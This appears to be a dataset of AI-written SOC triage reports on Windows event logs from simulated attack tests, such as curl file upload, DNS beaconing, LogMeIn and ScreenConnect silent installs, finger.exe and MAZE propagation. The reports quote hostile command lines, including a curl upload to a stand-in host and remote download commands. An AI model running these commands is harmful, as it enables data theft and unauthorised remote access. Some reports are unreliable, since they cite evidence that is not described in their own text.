Curl Upload File,"Upon examining the provided Windows event logs, the following observations regarding potential malicious activities are made:

1. **Execution of PowerShell (Sysmon Event ID 5)**: 
   - The presence of PowerShell execution on `Server002` by the user `SERVER002\admin_test` is notable, especially without corresponding details about command-line arguments. PowerShell is commonly used in both benign administrative tasks and malicious activities.
   - Example:
     - ProcessId: 1072
     - Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

2. **Use of Curl for Data Transfer (Sysmon Event ID 1)**:
   - The execution of `cmd.exe` with multiple curl commands suggests an attempt to upload a file (`c:\temp\filetestfile.txt`) to an external server (`www.example.com`). While curl is a legitimate tool, its usage in this context appears consistent with data exfiltration activities.
   - Example:
     - CommandLine: `""cmd.exe"" /c C:\Windows\System32\Curl.exe -T c:\temp\filetestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\filetestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\filetestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\filetestfile.txt www.example.com`

3. **Multiple Instances of `wevtutil.exe` Execution (Sysmon Event ID 5)**:
   - The tool `wevtutil.exe` was executed multiple times within a short period. It is often used to clear event logs, which can be a tactic to cover tracks after malicious actions.
   - Example activity:
     - Image: `C:\Windows\System32\wevtutil.exe`
     - Executed by user `SERVER002\admin_test` several times.

4. **Frequent Execution of `conhost.exe` (Sysmon Event ID 5)**:
   - The `conhost.exe` process is invoked repeatedly. While it can be benign, frequent and consecutive launches could be indicative of malicious console management activity masked to seem benign.

5. **Edge Update Processes (Sysmon Event ID 1)**:
   - Several Edge update processes are recorded. These seem consistent with routine update tasks as they operate under `NT AUTHORITY\SYSTEM` with no immediate malicious implications. 

6. **High Integrity Levels**:
   - Processes are running at high integrity levels, which, when combined with potential suspicious activities (like data exfiltration), can pose greater security risks.

**Assessment and Recommendation**:

- **Resolution: SUSPICIOUS**. The data exfiltration attempt via curl is the most concerning evidence of potential malicious activity, although it's not conclusively malicious without context like file contents. The combination of tools (Curl, PowerShell, and wevtutil) and high-integrity level execution warrants further investigation.
  
**Next Steps**:
- Confirm the legitimacy of the `admin_test` account's activity. Review user access policies and permissions.
- Investigate `c:\temp\filetestfile.txt` to understand the nature of the data and verify if these actions were authorized or routine.
- Check network traffic logs to confirm any data transfers to `www.example.com`.
- Consider monitoring and alert mechanisms for excessive use of administrative tools or high-risk applications like PowerShell and Curl.

It is advised to thoroughly review these suspicious behaviors, keeping in mind false positives can occur in complex environments."
Splashtop Streamer Execution,"### Analysis of the Provided Logs:

#### Sysmon Logs:
1. **PowerShell Execution:**
   - **EventRecordID 18000 and 18030:** The logs indicate the execution of PowerShell (`powershell.exe`) by the user `SERVER002\admin_test`. PowerShell is a legitimate Windows tool but is commonly used by attackers for malicious activities due to its powerful script execution capabilities.
   - The command line used for PowerShell indicates the execution context, but there is no specific script detailed that would immediately point to malicious activity.

2. **Command Executions:**
   - **EventRecordID 18022 and 18026:** A series of commands such as `hostname.exe` and `whoami.exe` are executed. These are standard Windows system commands; however, their rapid execution sequence might warrant further investigation into their purpose, especially on a high-value target like the CEO's computer.
   - **EventRecordID 18034:** The execution of `wevtutil.exe` with a command to export event logs (epl) is unusual. This could suggest an attempt to either exfiltrate logs or clean up traces.

3. **Frequent Use of `conhost.exe`:**
   - Frequent executions of `conhost.exe` are visible alongside other utility executions. While `conhost.exe` is a legitimate console window host used for command line operations, repeated, quick successive invocations may indicate script execution or automation, potentially as part of a malicious payload.

#### PowerShell Logs:
- Command and engine operations logged show `PowerShell` being invoked in a scripted manner (`HostApplication=powershell.exe & ...`), which can be typical for administrative automation, but in a suspicious context might be part of a larger script or tool used for malicious purposes.

#### Indicators of Concerns:
- **Rapid Invocation of System Utilities:** The frequency and sequence of executing legitimate utilities (`wevtutil.exe`, `hostname.exe`, `whoami.exe`) might be indicative of a script or automated task aiming to gather system information or alter system states.
- **Suspicious Export of Event Logs:** The use of `wevtutil.exe` to export logs is particularly concerning as it could signify an attempt to cover tracks or analyze the logs externally, which is not a standard practice by regular users.

### Assessment of the Situation:

The logs exhibit a series of potentially suspicious activities:
- The rapid execution of system command-line utilities, especially `wevtutil.exe` for exporting logs, is not normal user behavior and can indicate a compromise or preparatory actions for malicious purposes.
- The use of PowerShell in a scripted manner should be scrutinized further to determine what specific actions or scripts were executed.

### Resolution: **SUSPICIOUS**

Given the unusual pattern of rapid system utility executions and the suspicious use of `wevtutil.exe` to export logs, it is recommended that the activities be classified as **SUSPICIOUS**. Further investigation is warranted to determine the intent and scope of these actions.

### Recommended Actions:

1. **Conduct a Detailed Investigation:**
   - Examine the contents of any exported log files to understand the motivation behind this operation.
   - Investigate the command-line parameters and any scripts associated with `PowerShell` executions.

2. **Monitor for Anomalies in Real-Time:**
   - Enable enhanced monitoring on the CEO's machine for any new instances of similar behavior or unauthorized access attempts.

3. **Review Access and Permissions:**
   - Review the permissions and access logs of the user `SERVER002\admin_test` to ensure the account has not been compromised or misused.

4. **Engage in Threat Hunting:**
   - Conduct a broader threat hunting activity across the network for similar patterns of behavior to identify any coordinated or widespread attempts.

By proceeding with these investigative actions, the full scope and potential security impact can be better assessed and mitigated."
DNS Large Query Volume,"### Analysis:

Upon reviewing the provided Windows event logs, a few events stood out as potentially suspicious and point towards malicious activity.

1. **PowerShell Usage for DNS Requests**:
   The use of PowerShell with the script:
   ```
   powershell.exe & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type ""TXT"" ""file-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io"" -QuickTimeout}}
   ```
   This script repeatedly generates random DNS queries, which is often associated with domain generation algorithms (DGAs) used in malware to communicate with command and control (C&C) servers. The nature of these commands and the fact they are executing from PowerShell suggests this activity is highly suspicious and potentially malicious.

2. **User Account Privileges**:
   The events show a user account `admin_test` with high privileges (`SeDebugPrivilege, SeBackupPrivilege` etc.) being active at the time of the PowerShell and other suspicious activities. The use of such privileges implies potential attempts at privilege escalation or lateral movement.

3. **Process Activities**:
   There are multiple instances of processes like `wevtutil.exe` and `conhost.exe` being spawned in quick succession by the `admin_test` account, which are common in living-off-the-land (LotL) techniques used by attackers to evade detection by leveraging native Windows tools. 

4. **Repetitive Process Creation**:
   The repeated creation and rapid termination of native processes such as `whoami.exe` and `hostname.exe` suggest reconnaissance activities within the network which are normally not observed in regular user activity.

5. **Edge Update Activities**:
   Microsoft Edge Update related events are observed in the logs, though these generally follow legitimate update patterns. Without further evidence, they do not suggest direct malicious activity.

### Recommendations:

1. **Immediate Investigation**:
   - Investigate the origin and intention behind the PowerShell script usage and isolate the system if necessary to prevent further potential C&C communication.
   
2. **User Account Review**:
   - Review the `admin_test` user accountâ€™s activity, permissions, and recent login history. Verify if the account has been compromised or used maliciously.
   
3. **Network Monitoring**:
   - Monitor the outgoing DNS requests from the host to prevent unauthorized exfiltration of data or continued communication with C&C servers. Consider blocking suspicious domains.
   
4. **Incident Response**:
   - Collaborate with the incident response team to perform a deeper investigation and assess if there is any malware present that is executing the PowerShell commands or tampering with system settings.

5. **Policy and Privilege Adjustments**:
   - Re-evaluate user permissions and ensure least privilege principle is applied wherever possible to prevent unauthorized escalations.

### Resolution:
**MALICIOUS** - The logs contain activities indicative of malicious behavior, particularly around PowerShell-based potential DGA usage. Immediate action is required to investigate and mitigate the threat."
LogMeIn Files Detected Test on Windows,"Upon analyzing the provided Windows event logs, we can identify several points that are potentially indicative of malicious activity:

1. **Windows PowerShell Log**:
   - There is a PowerShell script execution that downloads an MSI file from ""https://secure.logmein.com/LogMeInIgnition.msi"" to the desktop and attempts a silent install (`/quiet`) followed by launching `LMIIgnition.exe` with silent installation flags (`""/S""`). While LogMeIn is a legitimate remote access software, the download and silent installation via PowerShell could indicate unauthorized remote access setup. This is especially concerning on a CEO's machine.
   
2. **Security Log**:
   - Event ID 4672: `admin_test` account received special privileges like `SeDebugPrivilege`, which are normally unnecessary for routine operations and could be used for privilege escalation or system tampering.
   - Event ID 4624: The account `admin_test` logs in using NTLM authentication from a workstation named `DESKTOP-3HL5B2P`. This suggests network presence, which could be part of a lateral movement strategy.

3. **Sysmon Log**:
   - Various processes running with the account `admin_test` including use of `PowerShell` and `HOSTNAME.EXE`, `whoami.exe`. The presence of command-line tools typically associated with system reconnaissance and administrative access indicates potential malicious intentions.
   - The process activity related to `msiexec.exe` with downloaded MSI packages and subsequent execution of LogMeIn could be signs of deployment of potentially unauthorized remote access tools.

4. **Application Log**:
   - LogMeIn Client installation activities are logged, which align with the PowerShell download and execution noted earlier.

From these observations, there seems to be a coordinated execution of potentially unauthorized remote access software and activities suggesting credential use beyond normal administrative tasks on this machine.

**Resolution: SUSPICIOUS**

The indicators suggest possible malicious intent, such as setting up unauthorized remote access to the CEO's machine. However, the activities resemble both legitimate and malicious scenarios without further context. As such, this requires further investigation:
- Verify if the installation of LogMeIn was authorized, or if it is part of routine IT operations.
- Investigate the origin and nature of the `admin_test` credentials.
- Check for additional indicators of compromise, such as unusual network traffic and persistence mechanisms.
- Monitor for further unauthorized access attempts or unusual behavior.

Take precautionary steps to secure systems and credentials, and conduct an in-depth investigation by cross-referencing logs and possibly contacting impacted teams or personnel."
Splashtop Execution,"Upon reviewing the provided logs from the Application, Security, Sysmon, and PowerShell logs, here are the observations and analysis:

1. **Application Logs:**
   - The logs indicate the installation of ""Splashtop Personal"" which is a remote desktop application. The MSI Installer events (11707, 1033, 1042) reflect successful installation events which might be normal but should be verified against the expected software on the CEO's system.

2. **Security Logs:**
   - EventID 4799 indicates the use of a `CallerProcessName` related to Microsoft Edge Installer (setup.exe). This type of event can be common for installations or updates but should be reviewed in accordance with organizational policy to ensure it wasn't an unauthorized software installation.

3. **Sysmon Logs:**
   - Sysmon logs indicate numerous executions of processes from the `AppData\Local\Temp` directory, such as _is8B2A.exe which is associated with InstallShield, typically used for application setups.

- The logs illustrate activities that need further investigation to rule out unauthorized software installations or potential setup for remote access. It is important to verify the legitimacy and authorization of these activities to secure the integrity of the endpoint and maintain compliance with organizational protocols."
DNS Regular Beaconing,"Based on the analysis of the Windows event logs provided, here is a detailed assessment:

### Suspicious and Anomalous Activities Identified

1. **PowerShell Activities:**
   - The logs reveal several instances of PowerShell executions with suspicious command lines, such as executing a script named `data-dns-beacon.ps1` located in a temporary directory.
   - PowerShell scripts residing in temporary directories and involved in beaconing activities (as indicated by parameters like `-Domain`, `-Subdomain`, `-QueryType TXT`, `-C2Interval`, `-C2Jitter`, `-RunTime`) are often associated with malicious activities such as data exfiltration or command-and-control (C2) communications.

2. **Sysmon Logs:**
   - There are multiple executions of `whoami.exe` and `hostname.exe`. While these utilities are benign on their own, repeated and systematic execution might suggest reconnaissance activities.
   - The presence of `wevtutil.exe` operations, a command-line utility for interacting with event logs, could potentially indicate attempts to clear logs or manipulate them to hide tracks.

3. **System and Security Logs:**
   - Time discrepancies or changes detected in the logs (adjustments made by `svchost.exe` related to system time) could potentially indicate attempts to manipulate timestamps as a forensic evasion technique.

### Indicators of Compromise

- **PowerShell Script Execution:** The execution of PowerShell scripts from a temporary directory with parameters associated with C2 communication is a notable indicator of potential malicious activity.
- **Usage of System Utilities:** The pattern of executing system utilities like `wevtutil.exe` might indicate log tampering efforts.

### Assessment of the Situation

The activities observed in the logs, particularly the suspicious PowerShell script execution and use of system utilities for potentially tampering with logs, align with tactics commonly employed in cyber attacks. Although each event on its own might be justifiable under certain circumstances, the combination and correlation of events are anomalous and suggestive of potential malicious intent.

### Conclusion: **MALICIOUS**

The combination of unexpected PowerShell use, time manipulation, and concerning `curl.exe` activities strongly indicates malicious intent warranting immediate investigation and mitigation efforts."
Nimgrab - Transfer Files,"### Detailed Analysis

Upon reviewing the provided Sysmon logs, several entries indicate processes executed under the `SERVER002\admin_test` user account. These processes include typically benign utilities such as `powershell.exe`, `cmd.exe`, `conhost.exe`, `whoami.exe`, and `svchost.exe`. However, particular attention is warranted due to the following observations:

1. **Powershell and Event Utility Processes**:
   - Processes such as `powershell.exe` and `wevtutil.exe` are being executed under an administrative context (`SERVER002\admin_test`). Powershell can be used for legitimate administrative tasks but can also be leveraged for script-based attacks and privilege escalation if misused.
   - The execution of `wevtutil.exe` suggests log manipulation, which might aim to cover tracks or for system administration purposes. However, this merits further investigation due to its potential use in adversarial tactics.

2. **Command Line Execution and File Access**:
   - There is a suspicious command line involving `cmd.exe` and a download attempt using a non-standard method with `nimgrab.exe`, attempting to retrieve a file from an external URL: `https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt`, into a temporary directory. Such behavior is often associated with attempts to download and execute remote payloads, suggesting potential malicious activity.
   - The downloading of a file to a temporary location using nested command executions (`cmd /c cmd /c`) is unusual and suggests an attempt to evade detection.

### Assessment

- **Suspicious Behavior**: The sequence of events indicates potential suspicious behavior:
  - The frequent execution of `wevtutil.exe` suggests possible log tampering or a setting change, which could be an indicator of stealthiness.
  - The download attempt using `nimgrab.exe` from a potentially untrusted source and executed from a temporary user directory indicates potential compromise and is atypical for most legitimate administrative tasks.
   
- **Malicious Indicators**:
  - The specific command executed by `cmd.exe` utilizing the `nimgrab.exe` with external URL access raises significant concern. This pattern is often used in script-based malware or during initial stages of an attack to gain further access.
  
### Resolution

Based on the available information, the activities captured in the Sysmon log are considered **MALICIOUS** due to the combination of log manipulation commands and the suspicious download attempt that is not typical in secure environments, especially on a high-profile machine like that of a CEO.

   - If applicable, restore the system from a known good backup post-forensic analysis and patch any identified vulnerabilities."
File download with finger.exe on Windows,"Upon analyzing the provided logs, several activities were observed that warrant a closer inspection for potentially malicious behavior. Here's a detailed breakdown:

### Observations and Analysis:

#### 1. **Security Log Entries:**
- Multiple `4624` (successful logon) and `4672` (special privileges assigned) events for the user `admin_test` on `SERVER002`. 
- `admin_test` is being granted high-level privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others multiple times in a short period.
- Logon types are `3`, indicating network logons, which may be common but are worth noting due to frequency and timing.

#### 2. **Sysmon Log Entries:**
- Numerous instances of `wevtutil.exe` and `conhost.exe` processes executed by `admin_test`.
- A prominent issue is the execution of `cmd.exe` with command-line arguments `/c finger base64_filedata@localhost`, which stands out as unusual. `finger` is a command rarely used legitimately in modern Windows environments and could suggest data exfiltration attempts or a malicious payload.
- The sequence of ""whoami.exe"" and several instances of ""conhost.exe"" being executed along with `cmd.exe` further support the hypothesis of unusual behavior.
- The metadata associated with these executions implies actions that go beyond routine user tasks and could indicate attempts to query system information or execute potentially harmful actions.

#### 3. **System Log Entries:**
- Several `svchost.exe` processes making time changes, possibly legitimate Windows time service updates, but overlapping with suspect `cmd.exe` activities.

#### 4. **Application Log Entries:**
- There's a record of the `edgeupdate` service stopping multiple times, possibly indicative of interference or failure; however, this might be part of routine updates.

### Assessment:

The combination of privileged access with repetitive `NTLM` network authentication, the nature and timing of the executed processes, and suspicious command usage (`finger` command combined with `cmd.exe`) raise significant concerns. These patterns are consistent with potential enumeration, lateral movement, or data exfiltration techniques commonly associated with malicious intrusion activities.

### Final Assessment:

- **Resolution: MALICIOUS**
  - The observed patterns strongly indicate malicious activities possibly exploiting valid administrative credentials (`admin_test`) for reconnaissance or privilege abuse.
  - Commands like `finger` with encoded or masked data suggest sophistication in approach, aiming to discreetly handle sensitive data.

### Guidance and Next Steps:

- **Immediate Response:**
  - Conduct an incident containment exercise by isolating the affected host (`SERVER002`) from the network.
  - Reset or disable the `admin_test` account and require password changes for privileged accounts.
  
- **Further Investigation:**
  - Conduct a detailed forensic analysis to trace the full scope of the breach, potentially involving endpoint threat detection and data recovery.
  - Review other systems for similar patterns as indicators of a broader campaign.
  
- **Preventative Measures:**
  - Implement more stringent monitoring and alerts for anomalous activities associated with privileged accounts.
  - Consider enhancing network segmentation and limiting direct access to critical systems for accounts invoking administrative actions. 

These actions should help mitigate immediate risks and guide the broader defense improvement efforts."
Steganographic Tarball Embedding,"**Analysis of Provided Logs:**

1. **Contextual Overview:**
   - The logs in question seem to focus primarily on the execution of processes on `Server002`. Notably, they contain several entries regarding Microsoft Edge's setup executables, as well as certain script executions using Windows PowerShell.

2. **Process Execution:**
   - Multiple entries were observed relating to the execution of `setup.exe` from the Microsoft Edge Installer. The arguments suggest that routine updates and processes related to Microsoft Edge are being executed. These actions generally appear benign as they align with typical software updates and installations.

3. **PowerShell Activity:**
   - A PowerShell command was executed with somewhat unusual command line parameters, where it attempts to manipulate content from a `.jpg` file and write it to a new file. The command does not match typical administrative or operational routines, notably because it seems to wrongly deal with image file objects in a manner suggesting potential exfiltration or encoding activities.
   - This incident aligns with potential misuse of PowerShell for operations that could involve data transformation or transfer, possibly indicating some form of data operation for which PowerShell is sometimes misused by malicious actors.

4. **Concerning Signs:**
   - Multiple instances of `wevtutil.exe` were executed by the same user `SERVER002\admin_test`. Tools like `wevtutil` can interact with Windows Event Logs, potentially to clear or query logs, which might signify a red flag if not accounted for within established administrative tasks.
   - Similarly, the use of `whoami.exe` in conjunction with `conhost.exe` may suggest privilege checks or audit tasks run by users looking for information about current user permissions or attempting unauthorized access.

5. **Overall Assessment:**
   - The logs present some benign activities associated with software updates and patches (Microsoft Edge Installer processes).
   - The PowerShell activity, when combined with frequent `wevtutil.exe` executions, is anomalous and can indicate initial stages of misuse or compromise.
   
**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct further investigation into the user `SERVER002\admin_test` to determine if the user is authorized for such activities.
- Review historical data and accesses associated with the `admin_test` account, especially focusing on PowerShell scripts and their purposes.
- Verify if the PowerShell command aligns with any known task or batch operations. If not, assess the data processed and any subsequent transfers which might reveal unauthorized data handling.
- Consider implementing enhanced monitoring for PowerShell activity with detailed logging to better track and identify any unusual commands.
- As a precautionary measure, review the integrity of the system and conduct an audit of processes executed around the timeframe to confirm no other suspicious activities occurred."
MAZE Propagation Script,"The analysis of the provided Windows event logs reveals several points of concern, indicating potentially malicious activity:

1. **PowerShell Activity**: The logs display evidence of suspicious PowerShell usage. Under Sysmon event ID 1, several executions of `powershell.exe` are observed with command-line arguments:
   - The PowerShell script attempts to copy the `cmd.exe` to remote machines and execute commands using `wmic` to create processes. The script includes conditionals to differentiate between online and offline machines and utilizes a simple but concerning method of leveraging `regsvr32.exe` to potentially execute malicious payloads.

2. **Process and User Anomalies**: The logs highlight the usage of administrative privileges (`SERVER002\\admin_test`) to execute potentially malicious PowerShell scripts across the network. Such privileges, when abused, pose a significant risk due to their potential to propagate malware or unauthorized access scripts.

3. **Execution of Common Utilities for Potential Abuse**: 
   - Tools like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are executed alongside `powershell.exe`. Although these tools are legitimate, their combinations and sequence of execution raise red flags, especially given their frequent use in post-exploitation scenarios to gather system information or clear event logs.

4. **Correlated Suspicious Activity**: The coordination of these events over a short period, especially the execution of PowerShell and numerous Command Hosts (`conhost.exe`), might point to attempts of enumeration, lateral movement, or setting persistence mechanisms.

**Threat Assessment**:
- This behavior potentially indicates a compromise. The use of scripting to copy and execute files remotely, along with the use of high-privilege accounts, simulates deeply suspicious network propagation tactics frequently used by adversaries.

**Guidance**:
- **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent further spread.
- **Detailed Forensic Investigation**: Examine the contents of the PowerShell script, along with any executed files (e.g., `data.exe`) that may have been deployed on targeted machines.
- **Credential Assessment**: Review user accounts and reset passwords for potentially compromised accounts, especially `admin_test`.
- **Log and Data Retention**: Ensure logs are retained prior to any clearing or tampering attempts for detailed forensic analysis.
- **Network Monitoring**: Increase surveillance on lateral movements and access patterns across critical network nodes.

**Conclusion**: Based on the observed logs and analysis, the activity is classified as **MALICIOUS**. Immediate action is necessary to contain and mitigate potential damage from this compromise."
Arbitrary file download using the Notepad++ GUP.exe binary,"### Detailed Analysis

Upon reviewing the provided Sysmon log entries, the following observations and assessments have been made:

1. **Microsoft Edge Update Activity:**
   - The logs contain multiple entries related to `MicrosoftEdgeUpdate.exe` and its associated components (`MicrosoftEdgeUpdateSetup_X86`, etc.). This activity seems to be legitimate as it involves Microsoft Edge software updates being executed by `NT AUTHORITY\SYSTEM`, which is a system-level account typically used for legitimate system tasks.
   - The processes are executing commands such as `/update`, `/svc`, `/regsvc`, and `/ping`, which are common parameters for software update processes. The `Microsoft Corporation` as the company in file details further supports the legitimacy of these activities.

2. **Execution of Host and Whoami Commands:**
   - Entries indicate the execution of commands like `HOSTNAME.EXE` and `whoami.exe` using `SERVER002\admin_test` account. These processes do not inherently indicate malicious behavior. The `hostname` and `whoami` commands are standard utility tools within Windows to return information about the machine name and the current user context, respectively.

3. **Powershell and Execution of Unusual Command via CMD:**
   - There are entries for `PowerShell.exe` being executed, but without any suspicious command line arguments visible, making it difficult to deem the activity as malicious without further context.
   - The command executed via `cmd.exe` is of particular interest: `cmd.exe /c mkdir ""c:\Temp"" & cd C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\ & GUP.exe -unzipTo """" ""C:\Temp"" ""Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6""`. This command downloads a file from `https://getsamplefiles.com`, which is a suspicious behavior considering it's downloading a zip file from an external URL and uses the `GUP.exe`, which is often used in Notepad++ updates but can also be abused for malicious purposes.

4. **Conhost and Wevtutil.exe Execution:**
   - Repeated instances of `conhost.exe` and `wevtutil.exe` being executed by `SERVER002\admin_test` do not alone suggest malicious activity as these are standard Windows processes used for console applications and event log management, respectively.

5. **Application Log Analysis:**
   - There is an entry indicating the `edgeupdate` service stopped, which aligns with the activities noted in the Sysmon logs relating to the Edge update process.

### Assessment and Resolution

Based on the provided log entries:

- The majority of the activities seem related to legitimate update processes for Microsoft Edge, including service registration and update commands executed via system and trusted user accounts.
- The use of GUP.exe to run a command fetching a file from a potentially untrusted URL is concerning and stands out as a suspicious action, as this could indicate an attempt to sideload a potentially malicious payload under the guise of legitimate software processes.

### Resolution: SUSPICIOUS

The activity surrounding the use of `GUP.exe` to download an external file needs further investigation. It is recommended to:

1. **Verify the Source:**
   - Ensure the source URL and the file being downloaded are legitimate and part of a known and safe update or installation process.

2. **Examine Execution Context:**
   - Determine if this process execution matches standard or expected behavior as per organizational policies or software use.

3. **Conduct Host Analysis:**
   - Run forensic analysis, including checking the hash (not provided here directly), origin, and integrity of downloaded files, and scrutinize the execution context to ensure no backdoor or unauthorized software is being installed.

Given the suspicious nature of this activity, a more thorough investigation is advised to rule out any malicious intentions or misconfiguration leading to unintended software actions."
ScreenConnect Application Download and Install on Windows,"After reviewing the provided event logs, here is the analysis:

### Overview of the Log Data
1. **Application Logs**:
   - ScreenConnect.msi was downloaded and installed from ""C:\\Users\\admin_test\\Downloads\\ScreenConnect.msi"" via PowerShell.
   - The event logs suggest that the ScreenConnect MSI package was downloaded from a URL: ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"" and installed using msiexec in silent mode (`/qn`).

2. **Sysmon Logs**:
   - Numerous instances of `wevtutil.exe` and `conhost.exe` were launched by the `SERVER002\\admin_test` user.
   - `whoami.exe`, `hostname.exe`, and PowerShell were executed, with PowerShell specifically used to download and initiate the installation of the ScreenConnect MSI file.
   - The command sequence through PowerShell shows the download and execution of an MSI installation file without any visible user input.

3. **PowerShell Logs**:
   - PowerShell was used to issue a command that downloads and executes the installation of the ScreenConnect software package from a remote URL.
   - The command involved downloading a file and executing it without visible user interaction, which could indicate automated or scripted actions.

4. **System and Security Logs**:
   - Time change events were recorded, which can be an indication of system time manipulation as a means to evade detection or cover tracks but could also be benign.
   - Various system processes being executed with SYSTEM or NETWORK SERVICE user context, which is typical for certain Windows services.

### Suspicious or Anomalous Behavior
- **Automated or Scripted Installation**: The use of PowerShell to download and silently install software can be indicative of unauthorized or malicious activities, especially if the installation was not expected or scheduled by IT.
- **Use of Publicly Hosted Network Resources**: The download of an MSI file from a cloudfront.net domain may also raise a flag for potential command-and-control techniques, unless it is a known and authorized software delivery channel for the company.
- **Multiple `conhost.exe` Associations**: The frequent association with `conhost.exe` could suggest obfuscation, though it could also be routine activity for GUI processes.

### Assessment
Given the provided logs:
- **Downloading and executing an installer** using PowerShell without an apparent legitimate business requirement or prior authorization suggests not only potential policy violation but a mild risk of compromise.
- The pattern of behavior aligns more with scripted or unauthorized administrative activity than typical user operations.

### Resolution
- **SUSPICIOUS**: The pattern of downloading and installing software via PowerShell without user intervention, combined with the use of a publicly hosted resource, is suspicious and warrants further investigation to determine if this activity was authorized or if it represents malicious intent.

### Recommendations
1. **Verify Authorization**: Confirm whether the download and installation of ScreenConnect was authorized by the IT department or the user.
2. **Network Monitoring**: Investigate whether the URL used for downloading the MSI file is expected and benign, ensuring it's not associated with known malicious services.

Lolbas replace.exe use to copy file,"Based on the Windows event log entries provided, let's carefully analyze the events for any signs of suspicious or malicious activities:

1. **PowerShell Execution**:
   - A PowerShell process is executed (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) by a user with the account `SERVER002\\admin_test`. PowerShell is a powerful tool and can be used benignly or maliciously. However, running commands through PowerShell without further context could possibly be suspicious if the command lines involved are not typical for normal operations.

2. **Consistent use of `conhost.exe` and `wevtutil.exe`**:
   - The logs indicate frequent invocation of `conhost.exe` and `wevtutil.exe` processes by the same user. `conhost.exe` is a legitimate Windows process used to facilitate console window management and may appear when command-line tools are run. `wevtutil.exe` is used for managing event logs. The consistent pattern of its execution without any other supportive activities might suggest a scripted operation or process automation. This could be benign or suspicious depending on the context. 

3. **`HOSTNAME.EXE` and `whoami.exe` Use**:
   - `HOSTNAME.EXE` and `whoami.exe` are legitimate Windows utilities. Running them in sequence usually indicates someone checking system information and the current user context, which might be routine, but if done repeatedly or unexpectedly it might hint at reconnaissance-like behavior.

4. **CMD Operations**:
   - The `cmd.exe` process is executed with complex command-line parameters: `\""cmd.exe\"" /c del %%TEMP%%\\file.cab &gt;nul 2&gt;&amp;1 &amp; C:\\Windows\\System32\\replace.exe \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\file.cab\"" %%TEMP%% /A` which involves file deletions and replacements in the TEMP directory. Such operations are suspicious if not part of a recognized business process, as they could be used to modify or replace files surreptitiously.

5. **EdgeUpdate Activity**:
   - There are logs for Microsoft Edge update processes, related to `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` and its components being executed as a part of Edge updating. This activity by itself looks standard as part of system updates, unless there's evidence it was triggered unexpectedly or if there were alerts about Edge being exploited.

**Assessment & Resolution**:
The log entries exhibit a range of activities including PowerShell usage, console host processes (`conhost.exe`), event log utilities (`wevtutil.exe`), and normal system utility executions (`hostname.exe`, `whoami.exe`). The `cmd.exe` processes with complex command-line operations might indicate potentially suspicious automation or scripting activities.

Given the provided information:
- The repetitive and somewhat unusual console and PowerShell usage without additional contextual details makes this activity stand out as possibly unconventional, although it is all executed with high integrity levels suggesting authorized access.
- Updates related to Microsoft products are expected but should be verified against the organization's patch management schedule to rule out any tampering.

The overall activity in the logs is classified as **SUSPICIOUS**. There is no direct evidence of malicious actions but several activities merit further investigation. Review execution contexts, scheduled tasks, recent user behaviors, and cross-reference against threat intelligence for any indicators.

**Guidance**:
- Verify if the PowerShell commands are expected by checking with system administrators.
- Investigate if the CMD operations align with regular automation or maintenance tasks.
- Verify the Microsoft Edge update schedule to ensure this process aligns with organization protocols.
- Consider increased monitoring for `SERVER002\\admin_test` user activity to capture any unauthorized or unexpected actions.
- Conduct a threat hunt to identify if similar patterns exist across other systems."
portproxy reg key,"Upon reviewing the provided event logs, there are several details and behaviors worth further analysis to determine whether they are indicative of suspicious or malicious activity. Let's break down the noteworthy observations:

### Windows PowerShell Log Analysis

- **Event IDs 1043 to 1049**: The command `powershell.exe & {netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1}` stands out. This command is creating a port proxy that listens on port 1337 and redirects traffic to the local address 127.0.0.1 on the same port. While port proxying can be legitimate, it's commonly used maliciously to redirect traffic or bypass network policies.
  
- Continuous execution of processes related to PowerShell with the same command could indicate the automation of setting up port forwarding.

### Sysmon Log Analysis

- **Process Executions**: The log records multiple executions of legitimate Windows utilities (`wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `powershell.exe`, `netsh.exe`) executed by the user `SERVER002\admin_test`. This user appears to execute the `netsh` command as seen in the PowerShell logs.
  
- **Netsh Command Usage**: The execution of `netsh.exe` with parameters to add a port proxy as seen in Sysmon logs and matching the PowerShell logs emphasizes the potential misuse of administrative privileges. The action initiated by `SERVER002\admin_test` aligns suspiciously with tool use that could be part of lateral movement or persistence techniques.

- **Integrity Levels and Process Execution**: The operations are executed at a high integrity level, which could suggest privilege escalation or misuse of an administrative account in an abnormal context.

### Overall Assessment

The repeated use of PowerShell and Sysmon logs showing actions to configure network settings (port proxying) using `netsh` and PowerShell scripts raise a flag. Port proxying itself is a known tactic used by attackers to maintain control or facilitate covert communication within networks by rerouting traffic.

### Conclusion and Recommended Action

The observed activities are certainly unusual and align with tactics seen in questionable or outright malicious actions. They potentially demonstrate an attempt to establish unauthorized communication pathways or prepare a persistent mechanism for further exploitation. Given the lack of additional context or intent confirmation, these actions should be treated with caution but not immediately classified as definitely malicious.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

1. **Further Investigation**: Review the origin of these actions with a specific focus on the `SERVER002\admin_test` user account. Verify whether these actions were sanctioned or expected as part of legitimate administrative activities.
   
2. **Network Monitoring**: Monitor traffic relating to port 1337 on `Server002` to identify any unusual communication patterns.

3. **System Audit**: Conduct a full audit of the system for indications of compromise through other data points, logs, and potential unauthorized files or executables present.

4. **User Review**: Analyze the activity and intent associated with `SERVER002\admin_test`, ensuring there is no unauthorized account access or privilege misuse.

